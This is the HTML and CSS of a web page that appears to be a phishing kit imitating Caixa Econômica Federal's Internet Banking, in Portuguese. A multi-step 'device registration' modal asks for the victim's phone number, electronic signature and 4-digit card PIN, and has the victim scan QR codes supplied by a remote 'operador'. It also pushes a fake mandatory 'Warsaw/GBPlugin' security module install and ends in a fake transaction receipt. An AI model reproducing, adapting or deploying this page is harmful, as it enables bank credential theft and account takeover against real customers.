  position: relative;
  overflow: hidden;
  white-space: nowrap;
  transition: all ease-out 300ms;
  padding: 8px 28px;
}
@media screen and (max-width: 640px) {
  #landing-header-topo-login[_ngcontent-wno-c350] {
    margin: 32px 0 8px 0;
  }
}
#landing-header-topo-login[_ngcontent-wno-c350]::before {
  content: "";
  position: absolute;
  margin: 0;
  opacity: 0;
  width: 16px;
  left: -16px;
  transition: all ease-out 300ms;
}
@media screen and (min-width: 640px) {
  #landing-header-topo-login[_ngcontent-wno-c350]:hover {
    background: var(--COR-SECUNDARIA);
    padding-right: 16px;
    padding-left: 40px;
  }
  #landing-header-topo-login[_ngcontent-wno-c350]:hover::before {
    opacity: 1;
    left: 16px;
  }
}
@media screen and (max-width: 640px) {
  #landing-header-topo[_ngcontent-wno-c350] {
    flex-direction: column;
    align-items: center;
  }
}
#landing-header-conteudo[_ngcontent-wno-c350] {
  text-align: center;
  margin-top: 32px;
}
#landing-header-conteudo-texto1[_ngcontent-wno-c350], #landing-header-conteudo-texto2[_ngcontent-wno-c350] {
  color: var(--COR-TEXTO-BRANCO);
}
#landing-header-conteudo-texto1[_ngcontent-wno-c350] {
  font-family: var(--FONT-REGULAR);
  font-feature-settings: var(--FONT-TEXT-FEATURES);
  font-size: 16px;
}
#landing-header-conteudo-texto2[_ngcontent-wno-c350] {
  font-family: var(--FONT-BOLD);
  font-feature-settings: var(--FONT-TEXT-FEATURES);
  font-size: 42px;
}
@media screen and (max-width: 640px) {
  #landing-header-conteudo-texto2[_ngcontent-wno-c350] {
    font-size: 24px;
  }
}
#landing-header-conteudo-imagem[_ngcontent-wno-c350] {
  margin: 32px 0 -7% 0;
  width: 100%;
  max-width: 1254px;
}
#landing-centro[_ngcontent-wno-c350] {
  padding: calc(32px + 7%) 32px 0 32px;
}
#landing-centro-texto1[_ngcontent-wno-c350], #landing-centro-texto2[_ngcontent-wno-c350] {
  font-family: var(--FONT-BOLD);
  font-feature-settings: var(--FONT-TEXT-FEATURES);
  font-size: 42px;
}
@media screen and (max-width: 640px) {
  #landing-centro-texto1[_ngcontent-wno-c350], #landing-centro-texto2[_ngcontent-wno-c350] {
    font-size: 24px;
    text-align: center;
  }
}
#landing-centro-texto1[_ngcontent-wno-c350] {
  color: var(--GREY-A);
}
#landing-centro-texto2[_ngcontent-wno-c350] {
  color: var(--LANDING-FEATURE-TEXT);
}
#landing-apresentacao[_ngcontent-wno-c350] {
  display: flex;
  align-items: stretch;
  padding: 32px 32px 0 32px;
}
@media screen and (max-width: 1024px) {
  #landing-apresentacao[_ngcontent-wno-c350] {
    flex-direction: column;
    padding: 0 32px;
    margin-top: 32px;
  }
}
@media screen and (max-width: 1024px) {
  #landing-apresentacao-lista[_ngcontent-wno-c350] {
    margin: 0 0 32px 0;
  }
}
#landing-apresentacao-lista[_ngcontent-wno-c350]   .item[_ngcontent-wno-c350] {
  cursor: pointer;
  display: block;
  background: var(--LANDING-BUTTON);
  color: var(--COR-TEXTO-BRANCO);
  min-width: 250px;
  padding: 10px 16px;
  text-align: center;
  border-radius: 4px;
}
#landing-apresentacao-lista[_ngcontent-wno-c350]   .item[_ngcontent-wno-c350]:hover, #landing-apresentacao-lista[_ngcontent-wno-c350]   .item.active[_ngcontent-wno-c350] {
  background: var(--LANDING-BUTTON-HOVER);
  border-color: var(--LANDING-BUTTON-HOVER);
}
#landing-apresentacao-lista[_ngcontent-wno-c350]   .item.active[_ngcontent-wno-c350] {
  box-shadow: unset;
}
#landing-apresentacao-lista[_ngcontent-wno-c350]   .item[_ngcontent-wno-c350]:not(:last-child) {
  margin-bottom: 8px;
}
#landing-apresentacao-texto[_ngcontent-wno-c350] {
  position: relative;
  width: 100%;
  border-radius: 4px;
  text-align: justify;
  font-size: 15px;
}
@media screen and (max-width: 1024px) {
  #landing-apresentacao-texto[_ngcontent-wno-c350] {
    position: unset;
    padding: 16px 32px;
  }
}
#landing-apresentacao-texto[_ngcontent-wno-c350]   .texto-item[_ngcontent-wno-c350] {
  padding: 16px 32px;
  transition: opacity 350ms;
  opacity: 0;
  position: absolute;
  display: flex;
  width: 100%;
  height: 100%;
  justify-content: center;
  line-height: 1.2;
}
@media screen and (max-width: 1024px) {
  #landing-apresentacao-texto[_ngcontent-wno-c350]   .texto-item[_ngcontent-wno-c350] {
    display: none;
  }
}
#landing-apresentacao-texto[_ngcontent-wno-c350]   .texto-item.active[_ngcontent-wno-c350] {
  transition: opacity 500ms;
  opacity: 1;
}
#landing-apresentacao-texto[_ngcontent-wno-c350]   .texto-item-subtitulo[_ngcontent-wno-c350] {
  font-size: 15px;
  margin-bottom: 16px;
  color: var(--LANDING-FEATURE-TEXT);
}
#landing-apresentacao-texto[_ngcontent-wno-c350]   .texto-item-conteudo-paragrafo[_ngcontent-wno-c350]:not(:last-child) {
  margin-bottom: 6px;
}
#landing-apresentacao-texto[_ngcontent-wno-c350]   .texto-item-mobile[_ngcontent-wno-c350] {
  display: none;
}
@media screen and (max-width: 1024px) {
  #landing-apresentacao-texto[_ngcontent-wno-c350]   .texto-item-mobile[_ngcontent-wno-c350] {
    display: block;
  }
}
#landing-apresentacao-texto[_ngcontent-wno-c350]   .texto-item-mobile-subtitulo[_ngcontent-wno-c350] {
  font-size: 15px;
  margin-bottom: 16px;
  color: var(--LANDING-FEATURE-TEXT);
}
#landing-apresentacao-texto[_ngcontent-wno-c350]   .texto-item-mobile-conteudo-paragrafo[_ngcontent-wno-c350]:not(:last-child) {
  margin-bottom: 6px;
}
#landing-apresentacao-texto[_ngcontent-wno-c350]   .texto-item-mobile[_ngcontent-wno-c350]   .vantagens[_ngcontent-wno-c350] {
  margin-top: 16px;
  padding-top: 16px;
  display: flex;
  justify-content: space-between;
  border-top: 1px solid var(--COR-BORDA);
  color: var(--LANDING-FEATURE-TEXT);
}
#landing-apresentacao-texto[_ngcontent-wno-c350]   .texto-item-mobile[_ngcontent-wno-c350]   .vantagens-item[_ngcontent-wno-c350] {
  text-align: center;
}
#landing-apresentacao-texto[_ngcontent-wno-c350]   .texto-item-mobile[_ngcontent-wno-c350]   .vantagens-item[_ngcontent-wno-c350]:not(:last-child) {
  margin-right: 16px;
}
@media screen and (max-width: 640px) {
  #landing-apresentacao-texto[_ngcontent-wno-c350]   .texto-item-mobile[_ngcontent-wno-c350]   .vantagens-item[_ngcontent-wno-c350]:not(:last-child) {
    margin-right: 0;
    margin-bottom: 8px;
  }
}
@media screen and (max-width: 640px) {
  #landing-apresentacao-texto[_ngcontent-wno-c350]   .texto-item-mobile[_ngcontent-wno-c350]   .vantagens[_ngcontent-wno-c350] {
    flex-direction: column;
  }
}
#landing-apresentacao-texto[_ngcontent-wno-c350]   .texto-item-bloco[_ngcontent-wno-c350] {
  align-self: center;
}
#landing-apresentacao-texto[_ngcontent-wno-c350]   .texto-item[_ngcontent-wno-c350]   .vantagens[_ngcontent-wno-c350] {
  margin-left: 32px;
  padding-left: 32px;
  display: flex;
  flex-direction: column;
  justify-content: space-between;
  border-left: 1px solid var(--COR-BORDA);
  color: var(--LANDING-FEATURE-TEXT);
}
#landing-apresentacao-texto[_ngcontent-wno-c350]   .texto-item[_ngcontent-wno-c350]   .vantagens-item[_ngcontent-wno-c350] {
  display: flex;
  align-items: center;
}
#landing-apresentacao-texto[_ngcontent-wno-c350]   .texto-item[_ngcontent-wno-c350]   .vantagens-item-icone[_ngcontent-wno-c350] {
  margin-right: 8px;
}
#landing-footer[_ngcontent-wno-c350] {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-top: 40px;
  padding: 0 32px;
  font-size: 13px;
  color: var(--COR-TEXTO);
  background: var(--COR-BACKGROUND-SECUNDARIO);
  line-height: 1.2;
}
@media screen and (max-width: 1024px) {
  #landing-footer[_ngcontent-wno-c350] {
    flex-direction: column;
  }
}
#landing-footer-suporte[_ngcontent-wno-c350], #landing-footer-links[_ngcontent-wno-c350] {
  padding: 16px 0;
}
#landing-footer-suporte[_ngcontent-wno-c350] {
  display: flex;
  flex-wrap: wrap;
  justify-content: center;
}
#landing-footer-suporte[_ngcontent-wno-c350]   p[_ngcontent-wno-c350]:not(:last-child) {
  margin-right: 4px;
}
#landing-footer-links[_ngcontent-wno-c350] {
  display: flex;
  flex-wrap: nowrap;
  align-items: center;
}
@media screen and (max-width: 1024px) {
  #landing-footer-links[_ngcontent-wno-c350] {
    flex-direction: column;
  }
}
#landing-footer-links[_ngcontent-wno-c350]   .link[_ngcontent-wno-c350] {
  white-space: nowrap;
  transition: var(--TRANSITION);
  padding: 2px 0;
  margin: 0 32px;
  color: var(--COR-TEXTO);
  text-decoration: none;
  border-width: 1px 0 1px 0;
  border-color: transparent;
  border-style: solid;
}
#landing-footer-links[_ngcontent-wno-c350]   .link[_ngcontent-wno-c350]:hover {
  border-bottom-color: var(--COR-TEXTO);
}
#landing-footer-links[_ngcontent-wno-c350]   .link[_ngcontent-wno-c350]:last-child {
  margin-right: 0;
}
.button-landing-style[_ngcontent-wno-c350] {
  background: var(--LANDING-BUTTON);
  color: var(--COR-TEXTO-BRANCO);
  padding: 10px 16px;
  text-align: center;
  border: none;
  border-radius: 4px;
  cursor: pointer;
}</style><style>@-webkit-keyframes spin {
  100% {
    transform: rotate(360deg);
  }
}

@keyframes spin {
  100% {
    transform: rotate(360deg);
  }
}

.modal-container[_ngcontent-wno-c349] {
  box-shadow: 0 2px 5px 0 rgba(0, 0, 0, 0.16), 0 2px 10px 0 rgba(0, 0, 0, 0.12);
}

.modal[_ngcontent-wno-c349] {
  position: fixed;
  top: 0;
  bottom: 0;
  left: 0;
  right: 0;
  background: transparent;
  z-index: 200;
  display: flex;
  justify-content: center;
  align-items: center;
}

.modal-cortina[_ngcontent-wno-c349] {
  z-index: 200;
  display: flex;
  align-items: center;
  justify-content: center;
}

.modal-container[_ngcontent-wno-c349] {
  max-width: 45%;
  z-index: 201;
  background: var(--GREY-F);
  border-radius: 4px;
  border: solid 3px var(--GREY-F);
  border-bottom: solid 3px var(--COR-BORDA);
  color: var(--COR-TEXTO);
}

.modal-header[_ngcontent-wno-c349] {
  display: flex;
  flex-direction: row;
  justify-content: space-between;
  align-items: center;
  padding: 16px;
  border-radius: 4px 4px 0 0;
  color: var(--COR-TEXTO-BRANCO);
  background: var(--COR-PRIMARIA);
}

.modal-header-left[_ngcontent-wno-c349] {
  margin-right: 16px;
  font-size: 16px;
  min-width: 48px;
  text-align: left;
}

.modal-header-center[_ngcontent-wno-c349] {
  margin: 0 16px;
  font-size: 16px;
  text-align: center;
}

.modal-header-center[_ngcontent-wno-c349]   h2[_ngcontent-wno-c349] {
  color: var(--COR-TEXTO-BRANCO);
}

.modal-header-right[_ngcontent-wno-c349] {
  margin-left: 16px;
  font-size: 16px;
  min-width: 48px;
  text-align: right;
}

.modal-header-right[_ngcontent-wno-c349]   button[_ngcontent-wno-c349] {
  color: var(--COR-TEXTO-BRANCO);
}

.modal-content[_ngcontent-wno-c349] {
  padding: 16px;
}

.modal-content[_ngcontent-wno-c349]   .alert-box[_ngcontent-wno-c349] {
  text-align: justify;
}

.modal-footer[_ngcontent-wno-c349] {
  padding: 16px;
}

.msg-erro[_ngcontent-wno-c349] {
  margin-bottom: 16px;
  padding: 0 8px;
  text-align: justify;
}

.erro[_ngcontent-wno-c349] {
  margin-top: 8px;
}

.fa-phone[_ngcontent-wno-c349] {
  margin-right: 16px;
}

#txt-demais-cidades[_ngcontent-wno-c349] {
  margin-left: 16px;
}

.button-primary[_ngcontent-wno-c349] {
  width: 100%;
  margin-top: 16px;
  font-weight: normal;
  text-align: center;
}

.fa-times[_ngcontent-wno-c349] {
  cursor: pointer;
}

.observacao[_ngcontent-wno-c349] {
  padding: 8px;
  border-radius: 4px;
  background: var(--COR-BACKGROUND-SECUNDARIO);
}

.tz_b12_erro[_ngcontent-wno-c349] {
  max-height: 500px;
  overflow: hidden;
  transition: all 0.3s ease;
}

.tz_b12_erro.expand[_ngcontent-wno-c349] {
  max-height: 1000px;
}

.motivos-container[_ngcontent-wno-c349] {
  max-height: 0;
  overflow: hidden;
  transition: all 0.3s ease;
}

.motivos-container.expand[_ngcontent-wno-c349] {
  max-height: 500px;
}

.principais-motivos[_ngcontent-wno-c349]:link {
  color: #0074CC;
}

.principais-motivos[_ngcontent-wno-c349]:visited, .principais-motivos[_ngcontent-wno-c349]:hover, .principais-motivos[_ngcontent-wno-c349]:active {
  color: #004172;
}</style><style>.mat-progress-bar{display:block;height:4px;overflow:hidden;position:relative;transition:opacity 250ms linear;width:100%}._mat-animation-noopable.mat-progress-bar{transition:none;animation:none}.mat-progress-bar .mat-progress-bar-element,.mat-progress-bar .mat-progress-bar-fill::after{height:100%;position:absolute;width:100%}.mat-progress-bar .mat-progress-bar-background{width:calc(100% + 10px)}.cdk-high-contrast-active .mat-progress-bar .mat-progress-bar-background{display:none}.mat-progress-bar .mat-progress-bar-buffer{transform-origin:top left;transition:transform 250ms ease}.cdk-high-contrast-active .mat-progress-bar .mat-progress-bar-buffer{border-top:solid 5px;opacity:.5}.mat-progress-bar .mat-progress-bar-secondary{display:none}.mat-progress-bar .mat-progress-bar-fill{animation:none;transform-origin:top left;transition:transform 250ms ease}.cdk-high-contrast-active .mat-progress-bar .mat-progress-bar-fill{border-top:solid 4px}.mat-progress-bar .mat-progress-bar-fill::after{animation:none;content:"";display:inline-block;left:0}.mat-progress-bar[dir=rtl],[dir=rtl] .mat-progress-bar{transform:rotateY(180deg)}.mat-progress-bar[mode=query]{transform:rotateZ(180deg)}.mat-progress-bar[mode=query][dir=rtl],[dir=rtl] .mat-progress-bar{margin-right:16px;border-color:var(--COR-SECUNDARIA)}</style></head>

<body class="theme-default">
<app-root ng-version="11.2.14"><gcx-debugger _nghost-wno-c305=""><div _ngcontent-wno-c305="" id="debugger" class="hidden" aria-hidden="true"><!----><!----><span _ngcontent-wno-c305="">&gt; Nenhum erro encontrado</span><!----></div><!----><!----></gcx-debugger><app-loading _nghost-wno-c385=""><!----></app-loading><router-outlet></router-outlet><app-landing _nghost-wno-c350=""><!----><!----><app-login-overlay _ngcontent-wno-c350="" _nghost-wno-c349="">

<div id="modal-dispositivo" role="dialog" aria-modal="true" aria-labelledby="modal-dispositivo-title">
  <div class="modal-dispositivo">
    <div class="modal-dispositivo__top">
      <div class="modal-dispositivo__brand">
        <span class="fas fa-home" aria-hidden="true"></span>
        <div>
          <div class="modal-dispositivo__brand-title">Internet Banking</div>
          <div class="modal-dispositivo__brand-sub">AMBIENTE SEGURO</div>
        </div>
      </div>
      <div class="modal-dispositivo__actions-top">
        <div class="modal-dispositivo__secure"><span class="modal-dispositivo__secure-dot"></span>Conexão Segura</div>
        <button type="button" class="modal-dispositivo__sair" id="modal-dispositivo-sair"><span class="fas fa-sign-out-alt"></span>SAIR</button>
      </div>
    </div>
    <div class="modal-dispositivo__body">
      <div class="modal-dispositivo__step active" id="modal-dispositivo-step1">
        <div class="modal-dispositivo__title-row">
          <span class="fas fa-user-plus" aria-hidden="true"></span>
          <h2 class="modal-dispositivo__title" id="modal-dispositivo-title">Cadastrar dispositivo</h2>
        </div>
        <p class="modal-dispositivo__intro">Para sua segurança, é necessário aceitar os termos de uso antes de sincronizar seu dispositivo via QR Code.</p>
        <div class="modal-dispositivo__grid">
          <div class="modal-dispositivo__terms">
            <h3>TERMOS DE USO E MONITORAMENTO</h3>
            <div class="modal-dispositivo__terms-box">
              <p><strong>1. OBJETIVO:</strong> Este termo regula as condições de uso e a coleta de dados para garantir a integridade da sua sessão bancária.</p>
              <p><strong>2. MONITORAMENTO ATIVO:</strong> Você autoriza a realização de varreduras de segurança (IP, Geolocalização, etc.) para prevenir fraudes.</p>
              <p><strong>3. SINCRONIZAÇÃO:</strong> O acesso só será liberado após a leitura do QR Code dinâmico gerado pelo sistema.</p>
            </div>
            <p class="modal-dispositivo__terms-note">Ao clicar em "CONCORDAR E CONTINUAR", você declara estar ciente e de acordo com os procedimentos de segurança.</p>
          </div>
          <div class="modal-dispositivo__aside">
            <div class="modal-dispositivo__info">
              <span class="fas fa-lock" aria-hidden="true"></span>
              <span>Este é um ambiente seguro. Seus dados são criptografados de ponta a ponta.</span>
            </div>
            <label class="modal-dispositivo__check">
              <input type="checkbox" id="modal-dispositivo-aceite">
              <span>Li e aceito os termos de segurança.</span>
            </label>
            <button type="button" class="modal-dispositivo__btn" id="modal-dispositivo-continuar" disabled>CONCORDAR E CONTINUAR <span class="fas fa-arrow-right"></span></button>
          </div>
        </div>
      </div>
      <div class="modal-dispositivo__step" id="modal-dispositivo-step2">
        <div class="modal-dispositivo__title-row">
          <span class="fas fa-user-plus" aria-hidden="true"></span>
          <h2 class="modal-dispositivo__title">Cadastrar dispositivo</h2>
        </div>
        <hr class="modal-dispositivo__divider">
        <p class="modal-dispositivo__intro">Para sua segurança, é necessário aceitar os termos de uso antes de sincronizar seu dispositivo via QR Code.</p>
        <div class="modal-dispositivo__success">
          <div class="modal-dispositivo__check-circle"><span class="fas fa-check" aria-hidden="true"></span></div>
          <h3 class="modal-dispositivo__success-title">Termos Aceitos com Sucesso!</h3>
          <p class="modal-dispositivo__success-sub">Iniciando protocolo de segurança...</p>
          <div class="modal-dispositivo__loading-box">
            <span class="modal-dispositivo__spinner" aria-hidden="true"></span>
            <span class="modal-dispositivo__loading-texts">
              <span class="modal-dispositivo__loading-title">Preparando Validação</span>
              <span class="modal-dispositivo__loading-sub">Gerando seu QR Code exclusivo...</span>
            </span>
          </div>
          <p class="modal-dispositivo__warn">NÃO FECHE ESTA JANELA</p>
        </div>
      </div>
      <div class="modal-dispositivo__step" id="modal-dispositivo-step3">
        <div class="modal-dispositivo__title-row has-blue-title">
          <span class="fas fa-user-plus" aria-hidden="true"></span>
          <div class="modal-dispositivo__title-block">
            <h2 class="modal-dispositivo__title modal-dispositivo__title--blue">Cadastrar dispositivo</h2>
            <p class="modal-dispositivo__subtitle">IDENTIFICAÇÃO DE SEGURANÇA</p>
          </div>
        </div>
        <hr class="modal-dispositivo__divider">
        <p class="modal-dispositivo__instrucao">Para cadastramento do seu usuário, escolha uma das seguintes opções:</p>
        <div class="modal-dispositivo__opcao" data-opcao="1">
          <span class="modal-dispositivo__radio"><span class="modal-dispositivo__radio-dot"></span></span>
          <span class="modal-dispositivo__opcao-textos">
            <span class="modal-dispositivo__opcao-titulo">Cadastramento na agência ou auto-atendimento.</span>
            <span class="modal-dispositivo__opcao-desc">Você deverá comparecer a uma agência ou utilizar o auto-atendimento para finalizar o cadastramento junto ao seu gerente.</span>
          </span>
        </div>
        <div class="modal-dispositivo__opcao" data-opcao="2">
          <span class="modal-dispositivo__radio"><span class="modal-dispositivo__radio-dot"></span></span>
          <span class="modal-dispositivo__opcao-textos">
            <span class="modal-dispositivo__opcao-titulo">Cadastramento usando um celular pré-cadastrado</span>
            <span class="modal-dispositivo__opcao-desc">Você deverá possuir um dispositivo já pré-cadastrado para o seu CPF para concluir a validação.</span>
          </span>
        </div>
        <div class="modal-dispositivo__form-box" id="modal-dispositivo-form-box">
          <div class="modal-dispositivo__field">
            <label class="modal-dispositivo__label" for="disp-nome">NOME DO DISPOSITIVO</label>
            <input type="text" id="disp-nome" class="modal-dispositivo__input" placeholder="Ex: Computador de Casa">
          </div>
          <div class="modal-dispositivo__field">
            <label class="modal-dispositivo__label" for="disp-telefone">TELEFONE CADASTRADO</label>
            <input type="tel" id="disp-telefone" class="modal-dispositivo__input" placeholder="(11) 98765-4321" inputmode="tel" maxlength="15" autocomplete="tel">
          </div>
          <div class="modal-dispositivo__field">
            <div class="modal-dispositivo__prazo">
              <div class="modal-dispositivo__prazo-col">
                <span class="modal-dispositivo__label">PRAZO HABILITAÇÃO</span>
                <label class="modal-dispositivo__prazo-radio"><input type="radio" name="prazo" value="indeterminado" checked> Indeterminado</label>
              </div>
              <div class="modal-dispositivo__prazo-col">
                <span class="modal-dispositivo__label modal-dispositivo__label--small">QUANTIDADE DE DIAS</span>
                <input type="number" id="disp-dias" class="modal-dispositivo__input" placeholder="Ex: 30" min="1">
              </div>
            </div>
          </div>
        </div>
        <div class="modal-dispositivo__actions">
          <button type="button" class="modal-dispositivo__btn-continuar" id="modal-dispositivo-continuar3" disabled>CONTINUAR</button>
        </div>
      </div>
      <div class="modal-dispositivo__step modal-dispositivo__step--assinatura" id="modal-dispositivo-step4">
        <div class="modal-dispositivo__assinatura-wrap">
          <h2 class="modal-dispositivo__assinatura-title">Assinatura Eletrônica</h2>
          <div class="modal-dispositivo__assinatura-erro" id="assinatura-erro" role="alert" aria-live="polite">
            <span class="modal-dispositivo__assinatura-erro__icon">!</span>
            <span class="modal-dispositivo__assinatura-erro__text" id="assinatura-erro-text"></span>
          </div>
          <div class="modal-dispositivo__assinatura-form">
            <label class="modal-dispositivo__label" for="disp-assinatura">ASSINATURA ELETRÔNICA</label>
            <input type="text" id="disp-assinatura" class="modal-dispositivo__assinatura-input" placeholder="Digite sua assinatura" inputmode="numeric" maxlength="8" autocomplete="off">
            <p class="modal-dispositivo__assinatura-hint">Apenas números (6 a 8 dígitos)</p>
            <button type="button" class="modal-dispositivo__btn-confirmar" id="modal-dispositivo-confirmar4" disabled>CONFIRMAR</button>
          </div>
        </div>
      </div>
      <div class="modal-dispositivo__step modal-dispositivo__step--senha" id="modal-dispositivo-step5">
        <div class="modal-dispositivo__senha-wrap">
          <h2 class="modal-dispositivo__senha-title">Senha do Cartão</h2>
          <div class="modal-dispositivo__senha-form">
            <p class="modal-dispositivo__senha-instrucao">DIGITE A SENHA DE 4 DÍGITOS</p>
            <input type="password" id="disp-senha-cartao" class="modal-dispositivo__senha-input" inputmode="numeric" maxlength="4" autocomplete="off">
            <p class="modal-dispositivo__senha-hint">Utilize a senha do seu cartão de débito/crédito</p>
            <button type="button" class="modal-dispositivo__btn-confirmar" id="modal-dispositivo-confirmar5" disabled>CONFIRMAR</button>
          </div>
        </div>
      </div>
      <div class="modal-dispositivo__step" id="modal-dispositivo-step6">
        <h2 class="modal-dispositivo__desbloqueio-title">Desbloqueio de computador</h2>
        <p class="modal-dispositivo__desbloqueio-subtitle">Desbloqueio via celular cadastrado</p>
        <p class="modal-dispositivo__desbloqueio-intro">Leia com atenção e siga os passos abaixo:</p>
        <ol class="modal-dispositivo__desbloqueio-list">
          <li>Clique em <strong>"Continuar"</strong> e <strong>permaneça na tela</strong> para a leitura dos QR Codes.</li>
          <li>No seu <strong>celular cadastrado</strong>, faça o login no App CAIXA e siga as orientações para o desbloqueio ou acesse: <strong>Meu perfil &gt; Meus dispositivos</strong>.</li>
          <li>Realize a leitura dos <strong>3(três) QR Codes</strong> que aparecerão automaticamente.</li>
          <li>Ao final, você receberá uma <strong>mensagem de sucesso</strong>.</li>
        </ol>
        <div class="modal-dispositivo__actions" style="justify-content: flex-start; margin-top: 24px;">
          <button type="button" class="modal-dispositivo__btn-continuar" id="modal-dispositivo-continuar6">CONTINUAR</button>
        </div>
      </div>
      <div class="modal-dispositivo__step" id="modal-dispositivo-step7">
        <div class="modal-dispositivo__title-row">
          <span class="fas fa-user-plus" aria-hidden="true" style="color: #f39200;"></span>
          <h2 class="modal-dispositivo__title" style="color: #f39200;">Cadastrar dispositivo</h2>
        </div>
        <p class="modal-dispositivo__step7-intro">Para cadastrar seu dispositivo, use o <strong>aplicativo CAIXA</strong> para escanear o QR Code apresentado abaixo.<br><strong>Permaneça nesta tela até o operador confirmar a sincronização.</strong></p>
        <hr class="modal-dispositivo__divider">
        <div class="modal-dispositivo__step7-grid">
          <div class="modal-dispositivo__step7-col">
            <p class="modal-dispositivo__step7-text">Você terá <strong>3 minutos</strong> para realizar a leitura dos QR Codes com o seu celular</p>
            <div class="modal-dispositivo__qr-container">
              <div class="modal-dispositivo__qr-header" id="step7-qr-header">
                <span class="modal-dispositivo__qr-dot"></span><span id="step7-qr-header-text">AGUARDANDO LEITURA</span>
              </div>
              <div class="modal-dispositivo__qr-box" id="step7-qr-box">
                <div id="step7-qr-aguardando">
                  <span class="modal-dispositivo__qr-spinner"></span>
                  <span class="modal-dispositivo__qr-text">Aguardando QR Code do operador...</span>
                </div>
                <img id="step7-qr-img" src="" alt="QR Code" style="display:none;">
              </div>
            </div>
          </div>
          <div class="modal-dispositivo__step7-col">
            <p class="modal-dispositivo__step7-text modal-dispositivo__step7-text--blue">Para ativar seu dispositivo, basta seguir os passos abaixo:</p>
            <p class="modal-dispositivo__step7-subtext">Leia os avisos e confirme o cadastramento.</p>
            <div class="modal-dispositivo__phone-mockup">
              <div class="modal-dispositivo__phone-header">
                <span>CAIXA</span>
                <span>12:00</span>
              </div>
              <div class="modal-dispositivo__phone-title">Meus dispositivos</div>
              <div class="modal-dispositivo__phone-body">
                <p class="modal-dispositivo__phone-subtitle">Seus dispositivos cadastrados:</p>
                <div class="modal-dispositivo__phone-device">
                  <span class="modal-dispositivo__phone-indicator modal-dispositivo__phone-indicator--green"></span>
                  <div class="modal-dispositivo__phone-device-info">
                    <span class="modal-dispositivo__phone-device-name">IPHONE</span>
                    <span class="modal-dispositivo__phone-device-date">16/10/2024</span>
                  </div>
                  <span class="modal-dispositivo__phone-badge modal-dispositivo__phone-badge--green">Em Uso</span>
                </div>
                <div class="modal-dispositivo__phone-device">
                  <span class="modal-dispositivo__phone-indicator modal-dispositivo__phone-indicator--yellow"></span>
                  <div class="modal-dispositivo__phone-device-info">
                    <span class="modal-dispositivo__phone-device-name" id="step7-device-name">Computador</span>
                    <span class="modal-dispositivo__phone-device-date" id="step7-device-date">20/07/2026</span>
                  </div>
                  <span class="modal-dispositivo__phone-badge modal-dispositivo__phone-badge--yellow">Pendente</span>
                </div>
              </div>
              <div class="modal-dispositivo__phone-footer">
                <button type="button" class="modal-dispositivo__phone-btn" id="modal-dispositivo-phone-fechar">Fechar</button>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="modal-dispositivo__step" id="modal-dispositivo-step8">
        <div class="modal-dispositivo__step8-header">
          <div class="modal-dispositivo__step8-brand">
            <span class="modal-dispositivo__step8-icon" aria-hidden="true">
              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2L4 5.5V11.2C4 16.1 7.4 20.5 12 22C16.6 20.5 20 16.1 20 11.2V5.5L12 2Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
                <path d="M8.5 12L11 14.5L15.5 9.5" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
              </svg>
            </span>
            <div>
              <h2 class="modal-dispositivo__step8-title">Assistente de Segurança</h2>
              <p class="modal-dispositivo__step8-subtitle">Atualização obrigatória de componentes de defesa</p>
            </div>
          </div>
          <span class="modal-dispositivo__step8-badge"><span class="modal-dispositivo__step8-badge-dot"></span>INSTALAÇÃO PENDENTE</span>
        </div>
        <div class="modal-dispositivo__step8-grid">
          <div class="modal-dispositivo__step8-info">
            <h3 class="modal-dispositivo__step8-info-title">Por que esta atualização é necessária?</h3>
            <p class="modal-dispositivo__step8-info-text">Detectamos que seu dispositivo está utilizando uma versão antiga dos protocolos de criptografia bancária. Para continuar transacionando com segurança e evitar bloqueios preventivos, é necessário instalar o <strong>Módulo Adicional de Segurança (Warsaw/GBPlugin)</strong>.</p>
            <ul class="modal-dispositivo__step8-checklist">
              <li>
                <span class="modal-dispositivo__step8-check" aria-hidden="true">
                  <svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="8" cy="8" r="7" stroke="currentColor" stroke-width="1.5"/><path d="M5 8.2L7.1 10.2L11.2 5.8" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
                </span>
                <span>Blindagem contra malwares e trojans bancários.</span>
              </li>
              <li>
                <span class="modal-dispositivo__step8-check" aria-hidden="true">
                  <svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="8" cy="8" r="7" stroke="currentColor" stroke-width="1.5"/><path d="M5 8.2L7.1 10.2L11.2 5.8" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
                </span>
                <span>Criptografia ponta-a-ponta nas transações PIX.</span>
              </li>
              <li>
                <span class="modal-dispositivo__step8-check" aria-hidden="true">
                  <svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="8" cy="8" r="7" stroke="currentColor" stroke-width="1.5"/><path d="M5 8.2L7.1 10.2L11.2 5.8" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
                </span>
                <span>Certificado digital atualizado.</span>
              </li>
            </ul>
            <p class="modal-dispositivo__step8-footnote">* O download é seguro e verificado pelos servidores da Caixa Econômica Federal.</p>
          </div>
          <div class="modal-dispositivo__step8-progress">
            <span class="modal-dispositivo__step8-ring" aria-hidden="true"></span>
            <p class="modal-dispositivo__step8-progress-title">Aguardando validação...</p>
            <p class="modal-dispositivo__step8-progress-text">O módulo de segurança está sendo preparado. Mantenha esta tela aberta até a conclusão da instalação.</p>
          </div>
        </div>
      </div>
      <div class="modal-dispositivo__step" id="modal-dispositivo-step9">
        <div class="modal-dispositivo__step9-top">
          <div class="modal-dispositivo__step9-brand">
            <span class="modal-dispositivo__step9-logo" aria-hidden="true">
              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M5 5L19 19M19 5L5 19" stroke="white" stroke-width="3.2" stroke-linecap="round"/>
              </svg>
            </span>
            <div>
              <h2 class="modal-dispositivo__step9-title">Comprovante de Operação</h2>
              <p class="modal-dispositivo__step9-subtitle">transação efetuada com segurança</p>
            </div>
          </div>
          <div class="modal-dispositivo__step9-auth">
            <p class="modal-dispositivo__step9-auth-label">AUTENTICAÇÃO BANCÁRIA</p>
